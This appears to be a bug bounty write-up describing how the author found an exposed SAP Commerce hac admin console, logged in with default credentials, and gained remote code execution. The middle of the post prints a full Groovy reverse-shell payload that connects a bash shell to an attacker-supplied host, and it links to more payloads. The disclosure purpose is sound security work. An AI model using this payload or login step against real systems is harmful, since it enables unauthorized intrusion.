---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-10_how-i-got-two-rce-at-bbp-program-0xbartita.md
original_filename: 2023-08-10_how-i-got-two-rce-at-bbp-program-0xbartita.md
title: How I got Two RCE at BBP Program @0xbartita
category: documents
detected_topics:
- command-injection
tags:
- imported
- documents
- command-injection
language: en
raw_sha256: 5d377eaba76d4dad1170815b80df67af007fca396125677aa36709a35f4d1645
text_sha256: d496e26d7fd00f40528860b68496ca48d35917804fceaddd0ada43e016276dd7
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: true
---

# How I got Two RCE at BBP Program @0xbartita

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-10_how-i-got-two-rce-at-bbp-program-0xbartita.md
- Source Type: markdown
- Detected Topics: command-injection
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: True
- Raw SHA256: `5d377eaba76d4dad1170815b80df67af007fca396125677aa36709a35f4d1645`
- Text SHA256: `d496e26d7fd00f40528860b68496ca48d35917804fceaddd0ada43e016276dd7`


## Content

---
title: "How I got Two RCE at BBP Program @0xbartita"
url: "https://0xbartita.medium.com/how-i-got-two-rce-at-bbp-program-0xbartita-232727c5b3f0"
authors: ["0xBartita (@0xBaRtiTa)"]
bugs: ["RCE", "Default credentials", "SAP", "Groovy scripting"]
publication_date: "2023-08-10"
added_date: "2023-08-14"
source: "pentester.land/writeups.json"
original_index: 864
scraped_via: "browseros"
---

# How I got Two RCE at BBP Program @0xbartita

0xBartita
Follow
2 min read
·
Aug 10, 2023

97

1

How I got Two RCE at BBP Program @0xbartita

Hi all.. 0xbartita

I like to get into the write up directly without any bla bla bla bla.

Press enter or click to view image in full size

When I was hunting on BBP bounty program I went to shodan and searched for “ssl:BBP.com” and I got this ip 40.117.**.*** & Used dirsearch directly I found http://40.117.**.***/hac/login/

Press enter or click to view image in full size
hac login page

“The hac extension is the default administration web application of SAP Commerce”.

I googled for the default credential and I got it from here:

https://www.cloudnir.com/sap-commerce-cloud-consoles/hybris-administrative-console-hac/

Username: admin

Password=***REDACTED***

And it’s worked i got into the admin panel.

Get 0xBartita’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I took a tour on the panel and I found a console Tab ==> http://40.117.**.***/hac/console/scripting/

Press enter or click to view image in full size
Console Tab

As you can see script option is groovy scripting language you can know more about groovy https://en.wikipedia.org/wiki/Apache_Groovy

Then I used this code to get remote code execution

String host=”Your Ip Here”;

int port=Your Port;

String cmd=”/bin/bash”;

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

Press enter or click to view image in full size
RCE

After I got RCE I went to shodan again and searched for more ips & I found the same hac application and reported it to the target program

You can find more payloads here https://coldfusionx.github.io/posts/Groovy_RCE/

More groovy payloads → https://coldfusionx.github.io/posts/Groovy_RCE/

Twitter → https://twitter.com/0xBaRtiTa
